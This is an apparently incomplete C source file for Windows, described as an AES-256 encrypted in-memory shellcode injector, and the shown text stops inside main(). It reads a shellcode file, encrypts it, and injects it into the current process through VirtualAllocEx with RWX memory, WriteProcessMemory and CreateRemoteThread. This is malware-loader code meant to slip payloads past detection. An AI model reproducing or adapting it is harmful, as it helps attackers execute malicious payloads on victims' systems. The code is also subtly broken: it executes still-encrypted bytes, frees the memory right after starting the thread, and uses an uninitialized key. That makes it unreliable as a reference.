//This code will create an AES256 encrypted in-memory shellcode injector.

#include <stdio.h> 
#include <windows.h> 
#include <wincrypt.h> 

//Function to encrypt data with AES256
int encryptAES256(BYTE *plainText, DWORD plainTextLen, BYTE *key, 
					DWORD keyLen, BYTE *cipherText, DWORD *cipherTextLen) 
{ 
	//Create variables to store data
	HCRYPTPROV hProv; 
	HCRYPTKEY hKey; 
	HCRYPTHASH hHash; 
	DWORD dataLen; 

	//Acquire a handle to the default provider
	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, 0)) 
	{ 
		printf("CryptAcquireContext failed with error %d \n", GetLastError()); 
		return 1; 
	} 

	//Create a hash object
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) 
	{ 
		printf("CryptCreateHash failed with error %d \n", GetLastError()); 
		CryptReleaseContext(hProv, 0); 
		return 1; 
	} 

	//Hash the key
	if (!CryptHashData(hHash, key, keyLen, 0)) 
	{ 
		printf("CryptHashData failed with error %d \n", GetLastError()); 
		CryptDestroyHash(hHash); 
		CryptReleaseContext(hProv, 0); 
		return 1; 
	} 

	//Create the symmetric key from the hash object
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) 
	{ 
		printf("CryptDeriveKey failed with error %d \n", GetLastError()); 
		CryptDestroyHash(hHash); 
		CryptReleaseContext(hProv, 0); 
		return 1; 
	} 

	//Calculate the size of the output buffer
	if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0)) 
	{ 
		printf("CryptEncrypt failed with error %d \n", GetLastError()); 
		CryptDestroyKey(hKey); 
		CryptDestroyHash(hHash); 
		CryptReleaseContext(hProv, 0); 
		return 1; 
	} 

	//Encrypt the plaintext
	if (!CryptEncrypt(hKey, 0, TRUE, 0, plainText, &plainTextLen, dataLen)) 
	{ 
		printf("CryptEncrypt failed with error %d \n", GetLastError()); 
		CryptDestroyKey(hKey); 
		CryptDestroyHash(hHash); 
		CryptReleaseContext(hProv, 0); 
		return 1; 
	} 

	//Copy the ciphertext to the output buffer
	memcpy(cipherText, plainText, plainTextLen); 
	*cipherTextLen = plainTextLen; 

	//Clean up
	CryptDestroyKey(hKey); 
	CryptDestroyHash(hHash); 
	CryptReleaseContext(hProv, 0); 

	return 0; 
} 

//Function to inject the encrypted shellcode into memory
int injectEncryptedShellcode(BYTE *encShellcode, DWORD encShellcodeLen) 
{ 
	//Create variables to store data
	LPVOID remoteMem; 
	HANDLE hProcess; 
	DWORD procId; 

	//Get the current process id
	procId = GetCurrentProcessId(); 

	//Open the current process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId); 
	if (hProcess == NULL) 
	{ 
		printf("OpenProcess failed with error %d \n", GetLastError()); 
		return 1; 
	} 

	//Allocate memory in the current process
	remoteMem = VirtualAllocEx(hProcess, NULL, encShellcodeLen, 
							MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
	if (remoteMem == NULL) 
	{ 
		printf("VirtualAllocEx failed with error %d \n", GetLastError()); 
		CloseHandle(hProcess); 
		return 1; 
	} 

	//Write the encrypted shellcode to the allocated memory
	if (!WriteProcessMemory(hProcess, remoteMem, encShellcode, 
								encShellcodeLen, NULL)) 
	{ 
		printf("WriteProcessMemory failed with error %d \n", GetLastError()); 
		VirtualFreeEx(hProcess, remoteMem, encShellcodeLen, MEM_RELEASE); 
		CloseHandle(hProcess); 
		return 1; 
	} 

	//Execute the shellcode
	if (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, 
							NULL, 0, NULL) == NULL) 
	{ 
		printf("CreateRemoteThread failed with error %d \n", GetLastError()); 
		VirtualFreeEx(hProcess, remoteMem, encShellcodeLen, MEM_RELEASE); 
		CloseHandle(hProcess); 
		return 1; 
	} 

	//Clean up
	VirtualFreeEx(hProcess, remoteMem, encShellcodeLen, MEM_RELEASE); 
	CloseHandle(hProcess); 

	return 0; 
} 

//Main function
int main() 
{ 
	//Create variables to store data
	BYTE *plainText; //Pointer to plaintext shellcode 
	DWORD plainTextLen; //Length of plaintext shellcode 
	BYTE key[32]; //AES256 key 
	DWORD keyLen = sizeof(key); //Length of the key 
	BYTE *cipherText; //Pointer to ciphertext 
	DWORD cipherTextLen; //Length of ciphertext 

	//Get the plaintext shellcode
	//(Assuming the plaintext shellcode is stored in a file)
	FILE *fp = fopen("shellcode.bin", "rb"); 
	if (fp == NULL) 
	{ 
		printf("Couldn't open file\n"); 
		return 1; 
	} 
	fseek(fp, 0, SEEK_END); 
	plainTextLen = ftell(fp); 
	rewind(fp); 
	plainText = (BYTE *)malloc(plainTextLen); 
	if (plainText == NULL) 
	{ 
		printf("Error allocating memory\n"); 
		fclose(fp); 
		return 1; 
	} 
	if (fread(plainText, 1, plainTextLen, fp) != plainTextLen) 
	{ 